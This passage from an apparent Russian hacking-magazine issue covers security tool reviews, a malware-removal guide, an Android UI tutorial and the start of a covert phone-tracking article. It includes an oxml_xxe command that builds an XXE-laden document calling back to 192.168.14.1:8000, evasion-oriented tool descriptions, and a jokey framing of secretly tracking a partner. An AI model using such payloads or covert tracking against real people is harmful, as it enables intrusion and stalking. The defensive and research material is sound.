•  взаимодействие скрыто в HTTP-заголовках;
•  загрузка обфусцированного пейлоада для обхода NIDS;
•  поддержка HTTP/HTTPS/SOCKS4/SOCKS5-прокси.

Удобство — надежный интерфейс со множеством важных функций:
•  кросс-платформенный на уровне как клиента, так и сервера;
• мощный интерфейс с поддержкой автозавершения и мультикоманд;
•  сохранение и восстановление сессий с ведением истории;
•  поддержка множества запросов для больших боевых нагрузок;
•  настраиваемый движок;
•  каждая настройка имеет полиморфный режим;
•  предоставляет API для разработки плагинов.
                APK STUDIO
                    APK Studio — это кросс-платформенная IDE для за-
                       дач реверс-инжиниринга (декомпиляции/редакти-
                        рования) и пересборки Android-приложения. И все
                        это с единым и удобным графическим пользова-
                       тельским интерфейсом, в котором даже есть под-
                        светка синтаксиса Android SMALI (*.smali) кода.

                     Особенности:
                         •  декомпиляция и сборка APK;
Автор:                   •  гибкая работа с Keystore и Key-Alias;
Vaibhav Pandey             •  автоматический zipalign;
                         •  подсветка синтаксиса (*.java; *.smali; *.xml; *.yml);
URL:                     •  просмотр изображений из ресурсов;
github.com/                •  установка  отредактированного  приложения
vaibhavpandeyvpz/apkstudio      в один клик;
                         •  поддержка фреймворков.
Система:
Linux/Windows            Благодаря данному инструменту проводить ручную
                      инструментацию кода стало очень просто и бы-
                          стро. Теперь можно оперативно вставлять свои ло-
                     гирующие вызовы в исследуемое приложение или
                        удалять какие-то механизмы безопасности, кото-
                     рые мешают проводить его анализ (например, SSL
                              Pinning). Ну а кто-то, возможно, захочет расширить
                      текущий набор функций чужого приложения. ;)
                  INTERACTIVE DELPHI RECONSTRUCTOR
                      Если ты думаешь, что Delphi умер, то ты глубоко
                      ошибаешься. Порой встречается такой софт, и его
                      необходимо анализировать на наличие уязвимо-
                        стей или на внутреннюю логику.
                          IDR (Interactive Delphi Reconstructor) — декомпи-
                        лятор исполняемых файлов (EXE) и динамических
                       библиотек (DLL), написанных на языке Delphi и вы-
                      полняемых в среде 32-разрядных операционных
                      систем Windows. Текущей версией программы мо-
Автор:                           гут обрабатываться файлы (как GUI, так и консоль-
crypto2001@mail.ru                      ных приложений), скомпилированные компилятора-
                    ми версий Delphi 2 — Delphi XE3.
URL:                         Конечной целью проекта поставлена разработ-
kpnc.org/idr32/en/index.htm                         ка программы, способной восстановить большую
                         часть исходных Delphi-текстов из скомпилирован-
Система:                       ного файла, но пока IDR, как и другие Delphi-деком-
Windows                        пиляторы, сделать этого не может. Тем не менее IDR
                        значительно облегчает такой процесс. По сравне-
                    нию с другими декомпиляторами анализ, выполнен-
                     ный IDR, отличается наибольшей полнотой и досто-
                        верностью. Кроме того, высокая интерактивность
                       делает работу с программой комфортной и (не по-
                     боимся этого слова) приятной.
                         IDR выполняет статический анализ  (анали-
                     зируемый файл не запускается на выполнение),
                        что позволяет безопасно изучать вирусы, трояны
                      и прочие приложения, запуск которых опасен или
                       нежелателен.
                       Программа не требует установки и не делает
                        никаких записей в реестр Windows.
                ANDROBUGS FRAMEWORK
                     Фреймворк AndroBugs — это сканер уязвимостей
                      для приложений под Android, который может при-
                        годиться как исследователям безопасности, так
                      и разработчикам приложений для поиска потенци-
                       альных уязвимостей в коде приложений.

                     Особенности:
                         •  поиск уязвимостей;
                         •  проверка на следование best practices;
                         •  проверка опасных shell-команд (например, su);Автор:
                         •  проверка приложений на использование меха-Yu-Cheng Lin
                        низмов безопасности;
                         •  сбор информации и сканирование большогоURL:
                          числа приложений.github.com/AndroBugs/
AndroBugs_Framework
                      Основная особенность, конечно, массовое ска-
                      нирование приложений. Можно указать целую ди-Система:
                      ректорию приложений, и остается ждать только ре-Linux/Windows
                         зультатов работы, которые потом будут сохранены
                        в базу данных MongoDB. Далее уже можно делать
                      запросы к этой базе данных как по одному кон-
                       кретному приложению, так и по определенной ин-
                     тересующей тебя уязвимости. На наш взгляд, ин-
                       струмент очень полезен тем, кто активно участвует
                        в bug bounty по мобильным приложениям.
                         Инструмент был впервые представлен на кон-
                     ференции Black Hat Europe 2015 в Амстердаме.
                     Для более близкого знакомства с инструментом со-
                       ветуем изучить презентацию Androbugs Framework:
                       an Android application security vulnerability scanner.
                GETHEAD
                         Gethead.py — это инструмент для анализа HTTP-за-
                         головков, написанный на  Python, позволяющий
                       на их основе идентифицировать уязвимости и от-
                        сутствие тех или иных защитных HTTP-заголовков.
                     Среди таких заголовков:
                         •  cache-control — кеширование приватного
                             контента;
                         •  x-download-options — политики скачивания
                         и открытия файлов;
Автор:                         •  access-control-allow-origin — политики контроля
Nathan LaFollette                            доступа;
                         •  x-webkit-csp — политика контентной
URL:                          безопасности;
httphacker.github.io/gethead/                         •  x-content-security-policy — аналогично;
                         •  strict-transport-security — использование
Система:                      HTTP over TLS/SSL;
Linux/Windows                         •  x-content-type-options — защита
                            от MIME-Sniffing;
                         •  x-frame-options — защита от Cross-Frame
                                  Scripting;
                         •  x-xss-protection — защита от Cross-Site Scripting.

                      Использование данных заголовков безопасности
                       очень важно на сегодняшний день. Если на твоем
                       сайте будет найдена уязвимость, то данные флаги
                      способны как усложнить жить атакующему, так и во-
                       все предотвратить атаку.
                JOOMLAVS
                       Joomla — это очень популярная CMS, и в ней есть
                        уязвимости, которые можно эксплуатировать. Се-
                        крет быстрой и массовой эксплуатации заключает-
                       ся в автоматизации работы. И никакой магии.
                           Joomlavs — это инструмент, который позволяет
                         оценить, насколько уязвима инсталляция Joomla.
                      Инструмент имеет базовые фингерпринты и может
                       сканировать на уязвимости:
                         •  компоненты;
Автор:                   •  модули;
rastating                  •  шаблоны.

URL:                    Joomlavs написана на Ruby, так что легко расширя-
github.com/rastating/        ема. Скрипт поддерживает многопоточность и по-
joomlavs                  зволяет задавать их число, а также работу с прокси
                      и Basic Auth. Перед установкой удостоверься, что
Система:                в твоей системе установлен Ruby как минимум вер-
Linux/Windows            сии 2.0. Процесс установки:

                        $ git clone https://github.com/rastating/
                        joomlavs.git
                        $ sudo gem install bundler && bundle install

                    Пример запуска:

                        $ ruby joomlavs.rb -u yourjoomlatarget.com
                          --scan-all

                        где yourjoomlatarget.com — доменное имя целевого
                        ресурса, а --scan-all — параметр, означающий пол-
                      ное сканирование ресурса.
                 OXML_XXE
                       Oxml_xxe — это инструмент на Ruby для встраива-
                       ния XXE/XML-эксплоитов в различные типы файлов.
                    На текущий момент поддерживаются следующие
                    форматы файлов:
                         •  DOCX/XLSX/PPTX;
                         •  ODT;
                         •  PDF;
                         •  GIF (экспериментально).

Автор:                Пример создания DOCX-файла с XXE-эксплоитом
BuffaloWill                с боевой нагрузкой, которая делает обратное сое-
                      динение к 192.168.14.1:8000:
URL:
github.com/BuffaloWill/oxml_   > ruby oxml_xxe.rb -s -i 192.168.14.1:8000
xxe                     Select payload 11 («remote_DTD»)

Система:               Другие примеры использования можно посмотреть
Linux/Windows            здесь (http://oxmlxxe.github.io/notes.txt).
                          Также есть два режима работы:
                                1. Режим создания (-b) — добавляется DOCTYPE
                         и вставляется XML Entity в файл, выбранный
                          пользователем.
                              2. Режим замены (-r) — программа идет по файлу
                         и смотрит вхождение символа § в документе.
                   И уже затем он заменяется на XXE-вектор.

                      Инструмент был впервые представлен на конфе-
                      ренции Black Hat USA 2015 в Las Vegas. Для бо-
                      лее близкого знакомства с инструментом совету-
                    ем изучить презентацию Exploiting XXE in file upload
                                functionality.
MALWARE
ПОЛНЫЙ ГАЙД
ПО БОРЬБЕ С МАЛВАРЬЮ
    ВЫДАЙ СВОЕМУ МЛАДШЕМУ БРАТУ,
       ПУСТЬ САМ ВСЕ ДЕЛАЕТ!
Много раз ты помогал своим друзьям и ро-
дичам, когда их компьютеры ложились под
натиском малвари. Нам тоже приходилось,
но в конце концов мы истощились и решили                                                                               Евгений Дроботун
                                                                                               drobotun@xakep.ruсделать ход конем, составив исчерпывающий
материал, который можно подсунуть постра-
давшей стороне и никак больше не участвовать.
Бери и пользуйся!

СОВЕТ ПЕРВЫЙ. ЧТО МОЖНО СДЕЛАТЬ С ПОМОЩЬЮ LIVE CD
(ИСПОЛЬЗУЕМ ДИСКИ ВОССТАНОВЛЕНИЯ СИСТЕМЫ ОТ РАЗ-
ЛИЧНЫХ ПРОИЗВОДИТЕЛЕЙ АНТИВИРУСНЫХ ПРОГРАММ)
Антивирусный Live CD — это решение для восстановления системы, приве-
денной в нерабочее состояние разного рода компьютерными инфекциями.
Практически все производители антивирусных средств предлагают своим
пользователям подобное, в большинстве случаев бесплатно.
   Как правило, такое решение представляет собой загрузочный диск на базе
одного из дистрибутивов Linux, в состав которого, кроме непосредственно
компонентов самой Linux, включены утилиты сканирования и лечения системы
от малвари. Помимо этого, в состав таких Live CD могут входить какие-либо до-
полнительные программные средства (утилиты редактирования и восстанов-
ления реестра, утилиты редактирования разделов диска, утилиты настройки
сети и другие).
   Краткую характеристику Live CD некоторых, наиболее популярных в нашей
стране производителей антивирусов можно посмотреть в таблице 1.





Таблица 1. Краткая характеристика пяти загрузочных дисков
наиболее популярных у нас антивирусных компаний
Kaspersky
Rescue
Disk 10





 Live CD
ESET
NOD32
Comodo
Rescue
Disk





Dr.Web
LiveDisk
Avira Rescue System

Выбранный образ Live CD можно записать как непосредственно на диск (CD
или DVD), так и на флешку. В Windows 7 и выше образ на диск можно запи-
сать стандартными средствами системы, достаточно по файлу образа щел-
кнуть правой кнопкой мыши, выбрать «Открыть с помощью», далее «Средство
записи образов дисков Windows». В более ранних версиях для записи обра-
зов на диск нужно использовать специально предназначенную для этого про-
грамму, например Nero Burning ROM или ее бесплатный аналог, что-нибудь
типа Img Burn или Ashampoo Burning Studio.
   Для записи загрузочного образа на флешку можно использовать утилиты,
предлагаемые для этого некоторыми антивирусными компаниями вместе с обра-
зами Live CD, либо, к примеру, утилиту WinSetupFromUSB. Выбираем в ней нужный
USB-накопитель, нужный файл образа, отмечаем пункт Auto format it with FBinst
и запускаем процесс.
   Если у тебя компьютер или ноутбук не слишком новые и без предустанов-
ленной Win 8 или выше, то загрузка с подготовленного загрузочного диска или
флешки не составляет труда. Входим в БИОС (обычно это клавиши Del или F2,
нажатые в момент загрузки), ме-
няем приоритет загрузки на CD-
ROM или USB-накопитель  (тут
стоит отметить, что возможность
загрузки  с USB  реализована
не во всех компьютерах) и ждем,
когда пройдет загрузка.
   Если на компьютере преду-
становлена «восьмерка» или что
повыше, то в режиме UEFI (в пода-
вляющем большинстве случаев
так оно и есть) могут возникнуть
некоторые  трудности.  Во-пер-
вых, бывают сложности с входом
в БИОС при загрузке компьюте-
ра, во-вторых, для того, чтобы за-
грузиться с Live CD, на таких ком-
пьютерах необходимо выключить
так называемый режим безопас-
ной загрузки. Как преодолеть эти
трудности, написано в соответ-
ствующих врезках.

                                                         Утилита WinSetupFromUSB





Последовательность действий при работе с Live CD
После успешной загрузки можно запустить проверку и лечение компьютера.
Как правило, все это проходит в автоматическом режиме. В некоторых Live CD
можно найти утилиту редактирования реестра. Эта функция весьма полезна
для анализа веток автозагрузки реестра (подавляющее количество малвари
использует именно реестр для запуска себя вместе с загрузкой системы) или
исправления нарушенных малварью параметров системы (см. врезку про лю-
бимые места в реестре).

СОВЕТ ВТОРОЙ. КАК ПРАВИЛЬНО ПОПРОСИТЬ О ПОМОЩИ
(ПРИЗЫВАЕМ НА ПОДМОГУ КОЛЛЕКТИВНЫЙ РАЗУМ ПОРТАЛА
VIRUSINFO.INFO)
Портал virusinfo.info — одно из немногих мест, где измученным нашествиями
разного рода малвари пользователям могут помочь, причем в большинстве
случаев абсолютно бесплатно (я не имею никакого отношения к этому сервису
и попрошу ни в коем случае не воспринимать этот совет как его рекламу).
  Сама помощь основывается на отчетах двух утилит: HijackThis от Trend Micro
и AVZ от Олега Зайцева.
   Первое, что можно сделать, — это воспользоваться сервисом «Помогите!».
Если ты на сто процентов уверен, что твой компьютер заражен, и все признаки
этого налицо, а антивирус, которым ты привык пользоваться, не помогает, то
регистрируйся на портале и далее действуй по схеме:





                                                               Используем
                                                                  сервис
                                                                  «Помогите!»
                                                                        от virusinfo.info
Пункт «Стандартные скрипты» в AVZ находится в меню «Файл». Итогом работы
этих двух утилит должны стать файлы логов (для AVZ они записываются в папку
LOG, которая находится в папке с самой программой, для HijackThis файл лога
пишется в папку с самой программой). Эти файлы и нужно приложить к сооб-
щению на форуме.
   Когда для лечения требуется выполнить какой-нибудь скрипт, текст этого
скрипта необходимо скопировать прямо из сообщения форума, далее в меню
«Файл» программы AVZ выбрать «Выполнить скрипт», вставить туда скопиро-
ванный ранее текст скрипта и нажать «Запустить».
   Если конкретных признаков заражения не наблюдается, но есть смут-
ное чувство, что с компьютером не все в порядке, на помощь придет сервис
VirusDetector. Для его использования регистрация необязательна. Последо-
вательность действий изложена на этой схеме:





Используем сервис VirusDetector

Не пройдет и получаса (по крайней мере мне ответили через двадцать пять
минут), и в почтовом ящике будет лежать подробный отчет о твоей системе
и возможных подозрительных местах на твоем жестком диске.

СОВЕТ ТРЕТИЙ. ЧТО ЕЩЕ МОЖНО ПРИЗВАТЬ НА ПОМОЩЬ,
КРОМЕ АНТИВИРУСА (ИСПОЛЬЗУЕМ НЕКОТОРЫЕ УТИЛИТЫ
АНАЛИЗА СИСТЕМЫ)

Autoruns
Как известно, для того, чтобы как следует обосноваться в системе, малварь
должна первым делом обеспечить свой запуск вместе со стартом системы.
В Windows достаточно много мест и возможностей для этого. Посмотреть
все эти места можно с помощью весьма известной в узких кругах программы
Autoruns, входящей в набор утилит от Sysinternals.
   Утилита показывает все программы, сервисы и библиотеки, так или иначе
запускающиеся вместе с системой, и дает возможность убрать любую про-
грамму из этих списков (либо на время, либо навсегда).





Autoruns от Sysinternals


Здесь стоит отметить, что многие вредоносные программы проверяют то ме-
сто, где была прописана автозагрузка, и восстанавливают все записи в слу-
чае их удаления, поэтому после того, как подозрительные программы удале-
ны из списков автозапуска, необходимо проверить, не появились ли они там
вновь, нажав кнопку Refresh (или клавишу F5).
   Если эта программа опять появилась в списке автозагрузки, то, во-первых,
из разряда подозрительных программ ее необходимо переносить в разряд
однозначно вредоносных (ни одна нормальная программа — за очень и очень
небольшим исключением — не будет постоянно проверять себя в автозапуске
и восстанавливать себя там), а во-вторых, для того, чтобы удалить такую про-
грамму из автозагрузки, ее нужно попытаться остановить диспетчером задач.
Но опять же многие вредоносные программы активно противодействуют это-
му, и убить процесс таких вредоносных программ с помощью стандартного
диспетчера задач не получается. В этом случае нам может прийти на помощь
какой-нибудь нестандартный диспетчер задач, например Process Hacker.

Process Hacker





Process Hacker

Process Hacker — бесплатная утилита с открытым исходным кодом для мони-
торинга системных служб и процессов, запущенных на компьютере. Представ-
ляет собой очень мощный инструмент, позволяющий производить множество
манипуляций с процессами, службами, их мониторинг и анализ (в том числе
и динамических библиотек DLL). Это:
•  завершение процессов (возможно использование семнадцати способов
   завершения процессов, позволяет справиться практически с любым про-
   цессом, запущенным в системе);
•  приостановка выполнения процессов и возобновление их;
•  просмотр статистики и истории выполнения процессов;
•  просмотр дампа памяти процесса;
•  просмотр потоков, переменных среды, хендлов;
•  чтение и правка дескрипторов безопасности для процессов и потоков;
•  обнаружение скрытых процессов;
•  выгрузка DLL;
•  просмотр и закрытие сетевых подключений
   и многое другое.

Для приостановки выполнения подозрительного процесса выбираем в меню,
выпадающем после клика по правой кнопке мыши, Suspend; чтобы гарантиро-
ванно завершить вредоносный процесс — в этом же меню Miscellaneous; да-
лее Terminator, выбираем нужные способы завершения процесса (можно все
сразу, какой-нибудь точно сработает) и жмем Run Selected.
  После этого можно удалять запись в автозагрузке, не боясь ее повторного
восстановления, и удалить сам файл вредоносной программы, путь к которой
можно посмотреть в том же Autoruns’е.
  Помимо Process Hacker’а, можно использовать Process Explorer из того же
набора утилит Sysinternals, правда, он обладает чуть менее разносторонними
возможностями.

Anvir Task Manager
Данная утилита совмещает в себе возможности менеджера автозагрузки
и менеджера процессов. Позволяет проводить анализ программ и служб, за-
пускающихся одновременно с системой, а также получать полную информа-
цию о запущенных процессах и сервисах, в том числе:
•  отслеживать полную информацию о запущенных процессах: путь, команд-
  ную строку, использование памяти, диска и процессора, загруженные DLL,
   используемые файлы, созданные окна, потоки и хендлы, счетчики произво-
   дительности, информацию о версии файла;
•  управлять областями автозапуска Windows: отключать, редактировать, от-
   слеживать и блокировать попытки программ добавить себя в автозагрузку;
•  ускорить время загрузки Windows за счет отключения ненужных программ
   и использования функции отложенного запуска программ, автоматически
   менять приоритет процессам или завершать процессы по заданному ша-
   блону;
•  анализировать информацию о текущей загрузке процессора и жесткого
   диска.
Anvir Task Manager

Программа существует в платном (Anvir Task Manager Pro) и в бесплатном (Anvir
Task Manager Free) варианте, который от платного отличается слегка урезан-
ной функциональностью.

Что такое Secure Boot

Secure Boot — одна из опций UEFI, предназначена для защиты компьютера
от буткитов, низкоуровневых эксплоитов и руткитов. В режиме безопасной
загрузки менеджер загрузки UEFI будет выполнять только подписанный циф-
ровым сертификатом код, который он сверяет со своей собственной базой
данных.
   Узнать состояние этой опции можно с помощью команды msinfo32.exe или
по надписи в правом нижнем углу экрана:
Состояние опции безопасной загрузки с помощью msinfo32.exe
и надпись в правом нижнем углу экрана



КАК ЕЩЕ МОЖНО ПРОНИКНУТЬ В БИОС (UEFI) В WINDOWS 8 (8.1)

Cпособ 1
В командной строке вводим:

shutdown.exe /r /o


Способ 2
На панели справа жмем «Параметры», затем — «Изменение параметров ком-
пьютера -> Обновление и восстановление». В нем открываем пункт «Вос-
становление» и в пункте «Особые варианты загрузки» жмем «Перезагрузить
сейчас». Далее выбираем «Диагностика», после жмем «Дополнительные па-
раметры» и затем «Параметры встроенного ПО UEFI». После всего этого на-
жимаем «Перезагрузка».
Способ 3
Нажимаем кнопку выключения компьютера в боковой панели и затем, удержи-
вая клавишу Shift, жмем «Перезагрузка». После этого появятся те же «Особые
варианты загрузки», что и во втором способе. Далее действуем по аналогии.

Как отключить Secure Boot

Данная процедура очень сильно зависит от конкретного производителя ноут-
бука или материнской платы, хотя общий смысл ее одинаков для всех компью-
теров. Опция протокола безопасной загрузки Secure Boot в основном находит-
ся в разделах Security, реже System Configuration или Boot, там нужно поставить
значение Disabled. Далее необходимо включить режим совместимости с дру-
гими операционными системами, называется он тоже у всех производителей
по-разному (Launch CSM, CMS Boot, UEFI and Legacy OS или CMS OS) и нахо-
дится в основном разделе под названием Advanced, далее подраздел BOOT
MODE или OS Mode Selection. После изменения необходимых параметров
не забудь их сохранить.





Выключение Secure Boot на ноутбуке с InsydeH20 setup utility


НЕКОТОРЫЕ ПОПУЛЯРНЫЕ У МАЛВАРИ МЕСТА В РЕЕСТРЕ

Автозагрузка

HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx
HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnceEx
HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
HKLM\System\CurrentControlSet\Services
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\
    Explorer\Browser Helper Objects
HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\
    Explorer\Browser Helper Objects


Параметры системы
Для того чтобы помешать пользователю обезвредить
зараженную систему, некоторые образцы малвари вно-
сят в реестр изменения, запрещающие использование
                                  WWWдиспетчера задач, командной строки и редактора рее-
стра. Также возможно несанкционированное отключе-     Ссылки на образы Live CD
ние контроля учетных записей (UAC).                                из этой статьи:
  В ветке                                                                           Kaspersky Rescue Disk 10

HKСU\SOFTWARE\Microsoft\Windows\                                     Live CD ESET NOD32
    CurrentVersion\Policies\System                                                                            Dr.Web LiveDisk

параметр DisableRegistryTools:                                Comodo Rescue Disk
•  0 — разрешить использование редактора реестра;
                                                                                           Avira Rescue System•  1 — запретить использование редактора реестра;
параметр DisableTaskMgr:
•  0 — разрешить использование диспетчера задач;      Ссылки на HijackThis и AVZ:
•  1 — запретить использование диспетчера задач;                                                                          AVZ
параметр EnableLUA:
•  0 — выключить UAC;                                                            HijackThis
•  1 — включить UAC.

                                                                   Ссылки на другие утилиты:
В ветке                                                                       Autoruns и Process

                                                                                            ExplorerHKCU\Software\Policies\Microsoft\Windows\System
                                                                                 Process Hacker
параметр DisableCMD:
                                                                                           Anvir Task Manager•  0 — разрешить использование командной строки;
                                                                          (бесплатный вариант)
•  1 — запретить использование командной строки;
•  2 — разрешить запуск командных файлов.                   WinSetupFromUSB
КОДИНГ
ANDROID 5.0: КОДИМ
ИНТЕРФЕЙСЫ БУДУЩЕГО
                    ИЗУЧАЕМ MATERIAL
                     DESIGN ОТ GOOGLE
                    НА ПРАКТИКЕ





                                                             Андрей Пахомов
                                                                         mailforpahomov@gmail.com
В мире Google Play нет справедливости: кто лучше
выглядит — тот всех клиентов и забирает. В среде
мобильной разработки лучше выглядеть означает
быть органично вписанным в дизайн операционной
системы.


Этим летом Google презентовала пятую версию ОС Android. Важной особенно-
стью стало свежее видение дизайна мобильных приложений. Разработчикам
предоставили новые инструменты, позволяющие создать приложения в стиле
Material Design. Под этим красивым словосочетанием скрывается целая фило-
софия оформления визуального, динамического
и интерактивного дизайна. Сегодня мы познако-
мимся с основными новшествами, которые по-
могут мобильному разработчику создать краси-
вое и органичное приложение.

ЦВЕТОВАЯ СХЕМА
Прежде всего, появилась новая схема (theme)
оформления приложения — Material Theme. Вот
основные параметры этой цветовой палитры:
colorPrimaryDark — самая темная часть интер-
фейса, цвет панели уведомлений;
colorPrimary — основное «цветовое пятно» на-
шего приложения, цвет панели инструментов;
textColorPrimary — цвет текста в панели инстру-
ментов;
windowBackground — фон приложения;
navigationBarColor — цвет панели навигации
внизу экрана.
Чтобы заполнить эти параметры, достаточно
                                                         Рис. 1. Цветовая схемаобъявить их в файле colors.xml:
СПИСКИ
В Material Design уделяется большое внимание отображе-
нию однотипных данных. Нельзя давать пользователю ску-
чать ни секунды. Даже если активное приложение пока-
зывает только унылые числа и графики, глаз пользователя
должно радовать то, как эта информация преподнесена.
Именно для этих целей появился класс CardView.          WWW
   Сегодня мы создадим свое приложение, чтобы лучше                                                                         Бесплатный видео-
разобраться, что же нам принес мир Material Design. Для на-       курс от Udacity
чала в layout-файле опишем внешний вид элементов буду-
                                                                    Официальные мате-щего списка.
                                                                        риалы от Google

                                                                В стандартном
                                                                                     Android SDK есть
                                                                              несколько вариантов
                                                                           отображения эле-
                                                                          ментов RecyclerView:
                                                                            линейно (Linear),
                                                                               сеткой (Grid) и сеткойВнутри будут храниться все визуальные элементы. В дан-                                                                               в шахматном порядке
ном случае это картинка-иллюстрация, заголовок к ней                                                                                        (StaggeredGrid).
и краткое описание. Сегодня мы используем RelativeLayout,
а значит, в параметрах элементов нужно указать, как имен-     И все-таки приме-
                                                                           нение дизайнерских
но они будут расположены относительно своих соседей.                                                                       решений должно
Чтобы приложение не «налезало» на края дисплея устрой-     быть рациональным.
ства, укажем отступ через параметр android:padding.           В мире еще много
                                                                           телефонов на ста-
                                                                          рых версиях ОС,
                                                                              на которых такое
                                                                        приложение работать
                                                                                не будет.


Зафиксируем иллюстрацию в верхнем левом углу. Параметром android:layout_
marginRight мы создаем небольшой промежуток от соседнего элемента:
Заголовок поместим сверху (alignParentTop) и с правой стороны (toRightOf)
от изображения:





Тем же способом добавим поле с кратким описанием: оно будет справа от изо-
бражения и под заголовком:





Теперь разберемся с тем, где будет храниться отображаемая информация.
Для этого создадим класс ItemData, в конструкторе которого будет вся необ-
ходимая информация.





Созданный элемент нужно размножить с помощью RecyclerView и заполнить
данными. В случае с объектами класса CardView нужно использовать класс
RecyclerView. Он немножко запутаннее, чем привычные нам адаптеры, но мы
с этим справимся. Для начала поместим его в layout-файле:
Рис. 2. Применение списка в стиле Material

Вспомним прошлую статью про библиотеки, она нам сегодня пригодится:





Требуемый адаптер можно создать, расширив класс RecyclerView.Adapter:




Разработчики Android постарались минимизировать затратный по времени
и ресурсам вызов метода findViewById, поэтому нам придется реализовать
собственный ViewHolder:
Создадим конструктор для адаптера. Главной его функцией будет передача
в адаптер списка с элементами ItemData:





Теперь переопределим метод onCreateViewHolder, он будет вызван ОС для ини-
циализации визуальных элементов приложения. Поэтому тут нам следует ука-
зать, что объект RecyclerView будет состоять из множества элементов item:





В методе onBindViewHolder происходит непосредственное заполнение дан-
ными ячеек CardView:





Нашему RecyclerView требуется также LayoutManager для того, чтобы указать,
как именно элементы будут расположены, сегодня нам будет достаточно ли-
нейного списка.
Использование измененного адаптера вызывает дополнительные сложно-
сти — теперь не так просто обработать прикосновение пользователя к элемен-
ту списка. Более свободное обращение с отображаемыми данными создало
необходимость самостоятельно реализовывать интерфейс обработки каса-
ний. Сначала сформируем абстрактный класс, который и будет реагировать
на касание экрана:




Теперь нужно задать обработчик любого касания вообще. Для этого созда-
дим объект класса RecyclerView.OnItemTouchListener:




В нем создадим экземпляр обработчика касания:



Конструктору требуется указать контекст приложения и реализацию интер-
фейса обработчика касания элемента.





Вся магия кроется в GestureDetector. Когда пользователь коснется рукой од-
ного из элементов RecyclerView, ОС вызовет следующий метод:
Если в точке, которой коснулся пользователь, су-
ществует элемент RecyclerView и есть обработчик
данного события (и это событие именно касание
экрана), то вызываем метод onClick с указанием
номера элемента RecyclerView.
   Такие  костыли —  наглядное  следствие
ООП-разработки. С увеличением глубины насле-
дования повышается связность кода и уменьша-
ется гибкость. С одной стороны, теперь гораз-
до легче создать приложение с ярким дизайном,
с другой — все чаще приходится использовать
костыли.

ДОБАВИМ ЭФФЕКТОВ
Чтобы воздействовать на психику искушенного
пользователя XXI века, современные компании
стремятся плоское сделать объемным, а объем-
ное — плоским. Поэтому мобильные телефоны
теперь толщиной с кредитную карту, а приложе-
                                                         Рис. 3. Онлайн-курсы
ния становятся «трехмерными». Любому объек-                                                   по Material Design
ту — наследнику класса View можно задать па-
раметр elevation, который создает эффект, будто
бы объект «парит» в воздухе и «отбрасывает тень».
  Для CardView закруглим углы и зададим отступ, а у RecyclerView укажем, что
фоном будет служить голубой прямоугольник с закругленными углами:





Он задается XML-файлом в папке drawables:
FLOATING ACTION BUTTON
Этот элемент пропагандируется Google уже долгое время, но раньше его при-
ходилось создавать вручную. В новой же ОС появился отдельный класс и все
упростилось до объявления в layout-файле.





ДИНАМИЧЕСКИЕ ЦВЕТА
Это еще одно нововведение, которое поможет приложению выглядеть орга-
ничней. Если в нем присутствуют яркие изображения (а это тоже тренд), то
оформление текстовых элементов будет разумно задать с помощью класса
Palette. В таком случае появится плавный переход от иллюстрации к тексту.





АНИМАЦИЯ
Новые элементы приложения не появляются и не исчезают мгновенно, все их
передвижения должны быть плавными. Это позволяет пользователю немного
сфокусироваться на изменениях и дарит ощущение целостности программы.
   Сперва создадим эффект плавного открытия и закрытия приложения:
заставим его плавно «выезжать» с нижнего края экрана и «уезжать» обратно.





Есть возможность придумывать свои варианты анимации. Создадим пап-
ку anim, а в ней файлы slide_in_right и slide_out_left, основная магия будет за-
ключаться в них. Анимация будет состоять в постепенном «сдвиге в сторону»
(translate) и в изменении прозрачности сменяемых Activity.





Вызываемое Activity будет выезжать справа, становясь все менее прозрачным.
Похожее будет происходить и с родительским Activity.





А теперь организуем запуск. Создадим новый Intent, ему укажем, какие Activity
будут задействованы, затем укажем набор опций. В опциях как раз и будет
описана созданная нами анимация.
Выход из secondActivity будет реализован похожим образом. Укажем, что все
методы выполнились корректно, и завершим Activity, выполнив анимацию.





Добавим эффект «сворачивания» к элементам списка. Для этого указываются
размеры элемента и то расстояние, которое анимация должна пройти.





ПРИКОСНОВЕНИЯ
Если пользователь взаимодействует с каким-то большим элементом, стоит
добавить эффект локальности прикосновения, в таком случае каждое касание
элемента смотрится эффектнее. С помощью StateListAnimator можно создать
эффект ряби (ripple effect) при нажатии на элемент. Посмотрим, как это выгля-
дит для объектов ImageView:





ВЕКТОРНЫЕ ИЗОБРАЖЕНИЯ
Если наше приложение будет запускаться на совершенно разных устройствах,
больших затрат потребует его оптимизация. В таком случае есть смысл пере-
йти на векторную графику. Это позволяет создавать хорошо масштабируемые
иллюстрации без потери качества изображения. Файл с векторным описани-
ем изображения достаточно поместить в папку drawbles.
А затем уже можно работать с ним как с обычным изображением:




ЗАКЛЮЧЕНИЕ
Сегодня мы рассмотрели новые фишки в Android SDK, которые обязательно
помогут тебе при создании приложений. Зачастую удачное приложение оста-
ется незамеченным из-за полного отсутствия адаптации к дизайну среды.
В рамках статьи сложно описать все нюансы, поэтому на нашем сайте ты най-
дешь исходный код приложения, в котором реализованы все описанные мето-
ды. Если остались какие-то вопросы, обязательно пиши мне на почту. Удачи!
КОДИНГ
 СЛЕДИМ
 ЗА ДЕВУШКОЙ
 С ПОМОЩЬЮ
             С ЕЕ СОГЛАСИЯ,
                РАЗУМЕЕТСЯ! ANDROID
ИНТРО
Сегодня мы проведем небольшое шпионское исследование
и попробуем незаметно собрать данные о передвижении ин-
тересующего нас объекта — подруги, ребенка или, скажем,
бабушки. Разумеется, с их письменно заверенного разреше-                                                                              Сергей Мельников
ния на сбор и обработку личной информации. А как же иначе?      mail@s-melnikov.net,
                                                                                                    www.s-melnikov.net
ШПИОН, ВЫЙДИ ВОН
Общеизвестно, что любой современный смартфон (или планшет) оснащен мо-
дулем системы глобального позиционирования GPS, а то и православным
ГЛОНАСС. Но даже если ты умудришься найти аппарат без него, карты Google
(и не только) все равно смогут быстро обнаружить тебя на этом многостра-
дальном голубом шарике. Для этого используется методика определения ко-
ординат с помощью вышек сотовой связи, информацию о положении которых
